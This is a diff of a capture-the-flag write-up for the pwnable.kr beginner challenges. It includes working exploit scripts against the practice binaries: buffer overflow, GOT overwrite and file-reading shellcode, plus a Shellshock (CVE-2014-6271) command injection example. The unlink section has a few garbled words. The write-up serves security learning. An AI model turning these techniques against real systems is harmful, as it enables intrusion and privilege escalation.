@@ -2,9 +2,13 @@
 
 ### fd
 
+*Exploit Primitive*: N/A, read source code
+
+*Exploit Technique*: N/A
+
 After ssh-ing into the box, we can run `ls` to see that there are three files present, a 32-bit Linux ELF executable, the source code for the executable, and a flag file.  Attempting to `cat` the flag yields a privilege error because we are a guest user.  Consequently, we need to use the executable to read the flag.  Examining the source code shows a call to `system("/bin/cat flag");` if the input buffer, read from a calculated file descriptor, is equivalent to `"LETMEWIN\n"`.  
 
-~~~c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -26,16 +30,20 @@ int main(int argc, char* argv[], char* envp[]){
         return 0;
 
 }
-~~~
+```
 
 The trick for this is to understand that the Linux file descriptor for standard input is 0.  Since `fd` is calculated by taking the input argument minus `0x1234`, we need to use an input argument of 4660 (the equivalent value in decimal).  This allows us to pass standard input into the binary to be processed.  We can create a file with the required text, or use `echo` (which will automatically append a new line `\n` character to the end of the text).  Using `echo "LETMEWIN" | ./fd 4660` yields the flag.
 
 
 ### collision
 
+*Exploit Primitive*: N/A, basic I/O
+
+*Exploit Technique*: N/A
+
 We are presented with a similar situation to the previous challenge, and need to use the `col` binary to read the flag.  In this case, we need to present an input of 20 bytes which will be processed and compared to `0x21DD09EC`.  The "processing" includes casting the input from a character string to an integer array.  Since an integer is four bytes, the input will parsed into five groups.  It is important to run `file` on the binary to determine endianess - in this case, the result is `ELF 32-bit LSB executable`, indicating little-endian (Least Signficant Byte).  This means that the bytes in each group will be reversed when processed as integers.  The integers are then summed into a `res` variable which is returned and compared to `0x21DD09EC`.  
 
-~~~c
+```c
 #include <stdio.h>
 #include <string.h>
 unsigned long hashcode = 0x21DD09EC;
@@ -67,14 +75,19 @@ int main(int argc, char* argv[]){
                 printf("wrong passcode.\n");
         return 0;
 }
-~~~
+```
 
 We can calculate `0x21DD09EC/5` to determine which integers to send.  The result is `113626824.8`, which means we can send `113626825` four times and `113626824` once to return `0x21DD09EC`.  Converting these values to hex yields `0x6C5CEC9` and `0x6C5CEC8`, respectively.  Again, we need to arrange in little endian format to correctly process the integers.  It is easiest to use `echo -e -n` and pipe the result to the executable given the bytes are not ASCII characters (here the `-n` flag suppresses a new line character, which is necessary otherwise we would input 21 bytes, not 20).  Running `./col $(echo -n -e "\xc8\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6")` yields the flag.
 
 ### bof
+
+*Exploit Primitive*: Buffer overflow via `gets`
+
+*Exploit Technique*: Overwrite comparison value using overflow
+
 For this challenge we are provided links to download a bof executable and the corresponding C source code.  Doing a quick check with `file`, `bof` is again a 32-bit little-endian ELF executable.  A quick scan of the source code shows a `gets` vulnerability in the `puts()` function. Opening the binary in gdb and diassembling `func()` provides the binary's assembly code: 
 
-~~~gdb
+```gdb
 gdb-peda$ disass func
 Dump of assembler code for function func:
    0x5655562c <+0>:     push   ebp
@@ -101,33 +114,38 @@ Dump of assembler code for function func:
    0x56555683 <+87>:    call   0xf7edba20 <__stack_chk_fail>
    0x56555688 <+92>:    leave  
    0x56555689 <+93>:    ret  
-~~~
+```
 
 This again shows there is no bound checking on the input; the binary will store the input buffer at `[esp]` which is equal to `[ebp - 0x2c]`.  Note also that a stack canary is used but not checked before running the system call.  Access to the system call requires passing the check: `cmp    DWORD PTR [ebp+0x8],0xcafebabe`.  Thus, a simple buffer overflow storing `0xcafebabe` at `ebp+0x8` is sufficient to get a shell (for full code, see `bof_solver.py`):
 
-~~~python
+```python
 def main(arguments):
     check = 0xcafebabe
     p = binary_connect(arguments)
     p.send(b'A'* 0x2c + b'B' * 8 + p32(check) + b'\n')
     p.interactive()
-~~~
+```
 
 ### flag
+
+*Exploit Primitive*: N/A, recognizing a packed binary
+
+*Exploit Technique*: N/A
+
 This challenge is a simple reversing challenge that presents a standalone binary to examine. Downloading and running the `flag` binary prints out the following prompt: `I will malloc() and strcpy the flag there. take it.`  Seems simple enough, but attempting to disassemble the binary with `objdump` yields the following: 
 
-~~~bash
+```bash
 $ objdump -d flag
 
 flag:     file format elf64-x86-64
-~~~
+```
 
 That's interesting.  Opening in a diassembler like Binary Ninja also shows a number of function calls, but no `main` entry point.  While the file is correctly identified as an ELF executable, something is still wrong.  Taking a look at the file's hex output shows the following: 
 ![flag_hex](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/pwnable.kr/toddlers_bottle/_images/flag.png)
 
 Note the `UPX!` bytes, which indicate that this file is compressed using the [upx packer](https://upx.github.io/).  Installing and running upx on the file generates a much more familiar output: 
 
-~~~bash
+```bash
 $ upx -d flag -o flag1
                        Ultimate Packer for eXecutables
                           Copyright (C) 1996 - 2018
@@ -155,24 +173,29 @@ $ objdump -d -M intel flag1 | grep "<main>:" -A 15
   401195:       e8 86 f1 ff ff          call   400320 <.plt+0x10>
   40119a:       b8 00 00 00 00          mov    eax,0x0
   40119f:       c9                      leave
-~~~
+```
 
 Here we see that the flag is loaded into rdx and is stored at address 0x6c2070.  Opening the binary in Binary Ninja shows that the pointer at this location points to the string at address 0x496628, which can be viewed to find the flag stored in plaintext.  
 
 ### passcode
+
+*Exploit Primitive*: `scanf` with incorrect parameter
+
+*Exploit Technique*: overwrite address via pointer manipulation
+
 This binary appears to have some `scanf` vulnerabilities, hinted at by the comments in the source code.  Running `clang passcode.c -o passcode` illuminates this hint with `clang`'s warning flags: 
 
-~~~bash
+```bash
 passcode.c:9:14: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
         scanf("%d", passcode1);
-               ~~   ^~~~~~~~~
+               ~~   ^``````~~
 passcode.c:14:21: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
         scanf("%d", passcode2);
-~~~
+```
 
 The key to this vulnerability is that the `passcode` values are stored as integers on the stack within the `login` function. `scanf` will attempt to store user input at the memory address pointed to by the stack values.  Running the program in gdb shows that `passcode1` attemps to store the value at an address in glibc, which does not have write privileges: 
 
-~~~gdb 
+```gdb 
 [-------------------------------------code-------------------------------------]
    0x804857c <login+24>:        mov    edx,DWORD PTR [ebp-0x10]
    0x804857f <login+27>:        mov    DWORD PTR [esp+0x4],edx
@@ -182,11 +205,11 @@ The key to this vulnerability is that the `passcode` values are stored as intege
 [------------------------------------stack-------------------------------------]
 0000| 0xfff2b6f0 --> 0x8048783 --> 0x65006425 ('%d')
 0004| 0xfff2b6f4 --> 0xf7631cab (<puts+11>:     add    ebx,0x152355)
-~~~
+```
 
 This will cause a segmentation fault when executed.  However, some simple testing shows that the username queried prior to `login` can be used to alter some stack values, which are later retrieved during the `login` function.  The `welcome` function accepts a full 100 characters using `scanf` and stores the input in a 100 character stack buffer.  This has an off-by-one error, as `scanf` accepts the full 100 characters and then adds a trailing null byte.  This is perfect for our uses, since the final four bytes of username input coincide with the stack address where `passcode1` is eventually stored.  This gives us control to change the pointer where the `passcode1` input will be stored with the username input.  We want to control execution flow to call the instructions after the credential checks in `login`, and a great target to hijack execution is using the GOT address for `fflush`, since it is called immediately after `passcode1` is retrieved.  We can retrieve the GOT address using pwntools and send it in as the last four bytes of our username.  Then, we overwrite this GOT address with the address of the validated login instructions.  Note that this address should be passed in as a string of integers, since `scanf` expects a string input of decimal numbers.  The following short script accomplishes this goal and gains elevated privileges to cat the flag.
 
-~~~python
+```python
 from pwn import *
 
 def exploit():
@@ -203,12 +226,22 @@ def exploit():
 if __name__ == "__main__":
         context.log_level = 'debug'
         exploit()
-~~~
+```
 
 ### random 
+
+*Exploit Primitive*: `rand()` without `srand` seed
+
+*Exploit Technique*: predict result of `rand()` and reverse required input
+
 This challenge includes a binary that attempts to implement the C library's `random` function. However, the key flaw is that the `random()` call is not first seeded, meaning that the random value generated will be the same each run.  Opening in gdb and setting a breakpoint after the call shows that the value is always equal to 0x6b8b4567.  Since the xor operation is reversible, simply calculating `0x6b8b4567 ^ 0xdeadbeef` yields the valid input `3039230856`.  Passing this value into the binary successfully elevates privileges and cats the flag.  
 
 ### input 
+
+*Exploit Primitive*: N/A, understanding of Linux I/O
+
+*Exploit Technique*: N/A
+
 This challenge is less about pwning / reversing and more about interacting with binaries.  The binary requires that we interact with it in five specific ways:
 * First, we need to open the process with 100 arguments (including the argument for the executable itself).  This is most easily done by creating a list and using pwntool's `process` module to open the binary with the listed arguments.  Furthermore, we need to make sure that the 'A'th (aka 41st) and 'B'th (aka 42nd) argument in the list adhere to the binary's requirement of `\x00` and `\x20\x0a\x0d`.  
 * Second, we need to send the binary data, which is receives on two different file descriptors.  The first is the `stdin` descriptor, which is the default used by pwntools's `process.send()` function.  The second is `fd=2`, which is `stderr`.  We can load this file descriptor by first creating a pipe using `os.pipe()` and mapping the input of the pipe to `stderr=` in the process's creation.  This will allow us to use `os.write(fd, data)` to write to the `stderr` file descriptor.  
@@ -218,7 +251,7 @@ This challenge is less about pwning / reversing and more about interacting with 
 
 This is all sufficient to pass the five requirements, however we are at an impasse; the binary tries to cat `./flag`, however the flag file does not reside in `/tmp`. We cannot `cp` the flag file because we do not have read permissions in `/home/`, nor can we run the script from `/home` because we cannot create the required `\x0a` file in the `/home` directory.  The solution is to create a symlink between a local `flag` file and the actual flag file in `/home/input2`.  The command `ln -sf /home/input2/flag flag` accomplishes this goal and achieves escalated privileges. 
 
-~~~python
+```python
 from pwn import *
 import sys
 import socket
@@ -271,14 +304,19 @@ def exploit():
 
 if __name__ == "__main__":
         exploit()
-~~~
+```
 
 ### leg
+
+*Exploit Primitive*: N/A, reversing ARM instructions
+
+*Exploit Technique*: N/A
+
 This is our first ARM challenge, and primarly tests a couple unique features of ARM assembly.  We are provided with both the source code file and the associated disassembly, which allows us to solve this challenge with just static analysis.  The program is simple: it calls three functions, adds their return values, and prints the flag if the sum is equivalent to the user provided input.  While tempting to simply consider the inline assembly in the source code, the key is to investigate the ARM disassembly to understand the return values.  
 
 `Key1()` is a simple function and displays some of the uniqueness of ARM.  Register 11 (`r11`) is roughly analogous to `ebp` in x86 as it stores the return base pointer address when `bl`, branch and link, is called.  This allows functions to call other functions and return to their function stack prior to branching.  The other key difference here is the use of the `pc` register (sometimes referred to as `r15`).  This register operates like the program counter (or `eip`) in x86, *however it always points two full instructions ahead of the current instruction*.  We will see why in the analysis of the next function.  This means the instruction `mov	r3, pc` actually moves `current instruction value + 2 * 4`, where four is the number of bytes of each ARM instruction.  This means the actual value stored into `r3` and then returned to the calling function via `r0` (similar to how `eax` returns a function value) is `0x00008ce4`.
 
-~~~gdb
+```gdb
    0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
    0x00008cd8 <+4>:	add	r11, sp, #0
    0x00008cdc <+8>:	mov	r3, pc
@@ -286,10 +324,11 @@ This is our first ARM challenge, and primarly tests a couple unique features of 
    0x00008ce4 <+16>:	sub	sp, r11, #0
    0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
    0x00008cec <+24>:	bx	lr
-~~~
+```
 
 `Key2()` adds additional ARM functionality using the `bx` instruction. `bx` is a branching instruction like `b`, however it also performs a check to see if the processor should switch to ARM's "thumb" mode.  Thumb mode is a more efficient processing mode in which instructions are shorter (two bytes instead of four).  The way a programmer enters thumb mode is to set the least significant bit of an instruction address (which will not affect the instruction itself, as it is either 16- or 32-bit aligned by ARM standards).  Thus, two back-to-back instructions such as `add	r6, pc, #1` and `bx	r6` will effectively jump to the next expected instruction (the instruction after `bx	r6`) in thumb mode.  We see that in this function, and thumb mode begins at address `0x00008d04`.  In this case, when we perform the operation `mov	r3, pc`, we do not add `2 * 4` as we did in the previous function, as thumb mode instructions are only 2 bytes long.  Therefore, we add `2 * 2` to the current instruction's address, or `0x00008d08`.  The next instruction then adds four to this value, making the return value `0x00008d0c`.
-~~~gdb 
+
+```gdb 
    0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
    0x00008cf4 <+4>:	add	r11, sp, #0
    0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
@@ -304,11 +343,11 @@ This is our first ARM challenge, and primarly tests a couple unique features of 
    0x00008d14 <+36>:	sub	sp, r11, #0
    0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
    0x00008d1c <+44>:	bx	lr
-~~~~
+```~
 
 `Key3()` adds a final new feature which is the `lr` register.  The `lr` register is analogous to the return `eip` stored on the stack during function calls, and allows functions to call other functions and then resume execution on the subsequent instruction.  Here we take the value of `lr` and store it into `r3` which is then returned to the `main` function.  Since the instruction immediately follwing `Key3()` is `0x00008d80` in `main()`, this is the return value for the function.  
 
-~~~gdb 
+```gdb 
    0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
    0x00008d24 <+4>:	add	r11, sp, #0
    0x00008d28 <+8>:	mov	r3, lr
@@ -316,15 +355,53 @@ This is our first ARM challenge, and primarly tests a couple unique features of 
    0x00008d30 <+16>:	sub	sp, r11, #0
    0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
    0x00008d38 <+24>:	bx	lr
-~~~
+```
 Validating the equivalence comparison means inputting the value equal to the three return sums. Since `scanf("%d", &key);` will convert the value to an integer, we need to input the string value of the sums, or `0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400`.  
 
 ### mistake
+
+*Exploit Primitive*: Logic error in unary operator precedence
+
+*Exploit Technique*: Leverage control of `stdin` to control read password value
+
 This program is relatively simple to understand once the bug is found.  It is clear that there is a mistake in the program based on the program name and prompt.  Identifying the bug can be done by either reviewing the source code, or by executing the binary and observing its behavior.  Running the program results in the process hanging, as if it is waiting for user input.  This is unexpected, as the program seemingly begins by reading the flag file and then prompting the user for input.  Because the prompt does not appear until after some user input is given, our preliminary understanding of the program is incorrect.  
 
 A quick search for the hint `operator priority` or compiling the source code with a rigorous compiler like `clang` gives hints as to what the issue is.  ![This guide](https://www.tutorialspoint.com/cprogramming/c_operators_precedence.htm) shows that the relational operators `< <= > >=` are given higher precedence (operated upon prior to) the assignment operator `=`.  This means the first line in `main()`, `if(fd=open("./password",O_RDONLY,0400) < 0)`, will first compare the return value (`fd`) returned by `open()` to 0.  Since the file is opened and returned a `fd`, the comparison will return a False (`0`) value.  This means that the `fd=` assignment will store `0` as the file descriptor later used to load `pw_buf`.  The subsequent command `read(fd,pw_buf,PW_LEN)` will effectively read data from file descriptor `0` (stdin) as the password.  This means we control both the password and the user input which is xor-d and compared to the password.  We can choose easy values for the two inputs, such as `BBBBBBBBBB` and `CCCCCCCCCC`, since B (0x41) xor 0x1 is C (0x42).  This passes the check and returns the flag.
 
+### shellshock 
+
+*Exploit Primitive*: CVE-2014-6271
+
+*Exploit Technique*: Command injection using bash
+
+This challenge presents a very simple C script long with a lengthy bash ELF binary that executes bash commands. The source code for `shellshock.c` is pretty sparse - it sets UID and GID values and then calls `/home/shellshock/bash -c echo shock_me`. The output for this script is, unsprisingly, `shock_me`. 
+
+The key to this challenge is that the bash binary is vulnerable to a CVE, specifically CVE-2014-6271.  Per NIST:
+
+> “GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables"
+
+This means that exporting an environment variable that defines a function can allow for arbitrary code exuection. For example, the following bash commands: 
+
+```bash
+export val='() { blahhh; }; echo hi'
+./shellshock
+```
+
+Returns the following output: 
+
+```bash
+hi
+shock_me
+```
+
+In the export, `val` and `blah` can be changed to any text string; the vulnerability is only dependent on the fact that a function is correctly defined.  Therefore, changing the export to `export val='() { blahhh; }; cat flag'` dumps the flag before seg-faulting.
+
 ### coin1
+
+*Exploit Primitive*: N/A, binary search programming
+
+*Exploit Technique*: N/A
+
 This is not an exploitation challenge but rather a programming challenge. The program allows a certain number of guesses as to which specific index of `n` coins is fake.  The number of guesses is not arbitrary, it is always greater than or equal to the `log_2(n)`.  This allows us to write a brief binary search program that weighs the first half of the `n` coins to determine if the fake coin is in that half.  The search then continues in the half that is confirmed to hold the fake coin. The most difficult part of this challenge is handling a sometimes quirky I/O interface, which occassionally requires the user to input the fake coin two times in a row once it is identified with a weight of nine.  The following code performs the binary search and iterates over subsequent challenges when the first problem is solved: 
 
 ```python
@@ -394,6 +471,11 @@ def exploit():
 Note that the flag is returned when 100 challenges are solved.  There are some instances where the connection speed external to the pwnable server causes enough lag that fewer than 100 challenges are solved.  Running again was sufficient to return the flag.
 
 ### blackjack
+
+*Exploit Primitive*: Integer underflow
+
+*Exploit Technique*: Underflow cash amount when a bet is lost
+
 This challenge has a simple vulnerability, but a larger code base that can be used to confuse and deviate the challenger.  One issue that initially led me awry is an incorrect use of `srand((unsigned) time(NULL));`.  This is used to seed the `rand` function, but is done so every time a new number is generated.  The resulting problem is that the seed is identical within the same one second interval.  This then returns deterministic cards within that interval. While this is an error that can potentially be exploited, there is a much worse error in the program.  
 
 The source code shows that the `bet` value is a signed integer and no lower bound check is implemented.  Furthermore, the `cash` amount is determined through simple addition and subtraction of the `bet` depending on the outcome.  This means we can bet an arbitrary large negative value (within the bounds of an `int` data type) and intentionally lose to build our `cash` to $1M.  The following code performs this task and retrieves the flag after intentionally losing.  *Note: this exploit only fails if we happen to land on 21, which is rather unlikely.*
@@ -461,8 +543,12 @@ def exploit():
   print(p.recvline())
 ```
 
-
 ### uaf 
+
+*Exploit Primitive*: Use after free (UAF)
+
+*Exploit Technique*: Pointer corruption on the heap, triggered by UAF
+
 This is the first heap challenge, and it introduces a basic Use After Free vulnerability in a C++ executable.  The key to this challenge is understanding how C++ uses inheritance and constructors to create the `man` and `woman` classes.  The data is split into two areas: the vtables which contain constructor and member function addresses, and the heap which stores relevant data to each object.  An example of each is shown below.  
 
 ```
@@ -491,6 +577,11 @@ Heap
 The user controls when the UAF is created and triggered by choosing the "free" and "use" options, respectively.  First, freeing both classes will actually free four total heap chunks: two 0x30 length chunks for each inherited `Human` class, and then the 0x20 `man` and `woman` chunks.  The last "after" choice allocates user input to the heap using C++'s `new` operation, and the user chooses how much to allocate.  By strategically allocating less than 0x18 bytes, the returned chunk will absorb one of the man / woman classes.  Tcache is a FIFO stack, so the first chunk overridden is the former `woman` chunk.  This is not particuarly useful, because `man->introduce()` is the first function called in the "use" choice.  If the `man` chunk is not overriden then this call will lead to a segmentation fault.  So both chunks must be overridden by less than 0x18 bytes of an external file.  The overwrite strategy is to clobber the first qword which maintains the `man` vtable address; when `man->introduce()` is called, the binary finds `man`'s vtable and then the offset for `introduce()` within that vtable.  As shown in the first data dump, that offset is 0x18 bytes into the vtable.  By overwriting the vtable address to 0x8 bytes before its actual value, the 0x18 will instead call `give_shell()`, which returns a user shell and can read the flag from the server. 
 
 ### asm
+
+*Exploit Primitive*: Shellcoding within `seccomp` restrictions
+
+*Exploit Technique*: N/A
+
 This is a basic shellcoding challenge within a `seccomp` environment. The basic idea of the challenge is to read a ridiculously named file from the remote server using only the `read, write, open, and exit` functions.  The challenge provides a direct call to the shellcode and also starts with a stub which clears all potentially needed registers.  Because the shellcoe is `mmap`d at a known address, it is possible to use that known address as a hard-coded value in the shellcode.  However, relative values could be leveraged to make the exploit behave more dynamically.  
 
 The shellcode is relatively simple. First, the filename must be loaded into memory because it does not already exist.  Before storing this, a few instructions are required to store the current address and jump rip past the filename. Since the filename is a known length, this is relatively simple.  The process of reading the flag requires calls to `open()`, `read()`, `write()` and `exit()`, in that order.  The following code generates the required shellcode to read the flag and write it to `stdout`.   
@@ -528,16 +619,15 @@ shellcode += b"\x0F\x05"                        # syscall
 shellcode += b"\x48\x31\xFF"                    # xor rdi, rdi
 shellcode += b"\xB8\x3C\x00\x00\x00"            # mov eax, 60
 shellcode += b"\x0F\x05"                        # syscall
-
-print(shellcode)
-```
-
-```
-Mak1ng_shelLcodE_i5_veRy_eaSy
 ```
 
 ### unlink
-This is another heap challenge with a heap buffer overflow courtesy of `gets()`.  The `OBJ` structures are `malloc`d on the heap and user input can overflow the first object to clobber the second and / or third object.  This is followed by the `unlink()` function which modfies memory within the objects pointed to by `B->fd` and `B-bk`.  Both these values can be clobbered by the heap buffer overflow.  The trick for this challenge is: how should they be modified?  The program contains a `shell()` function which resides at a stack address because the binary is compiled without PIE.  So the goal is to hijack eip with the address to shell through the overflow and unlinking. 
+
+*Exploit Primitive*: Heap buffer overflow
+
+*Exploit Technique*: Heap linked list corruption 
+
+This is another heap challenge with a heap buffer overflow courtesy of `gets()`.  The `OBJ` structures are `malloc`d on the heap and user input can overflow the first object to clobber the second and / or third object.  This is followed by the `unlink()` function which modfies memory within the objects pointed to by `B->fd` and `B-bk`.  Both these vas can be clobbered by the heap buffer overflow.  The trick for this challenge is: how should they be modified?  The program contains a `shell()` luefunction which resides at a stack address because the binary is compiled without PIE.  So the goal is to hijack eip with the address to shell through the overflow and unlinking. 
 
 Overwriting the return instruction pointer directly is impossible, because storing `shell()`'s address would also overwrite data within the shell function during unlinking.
 
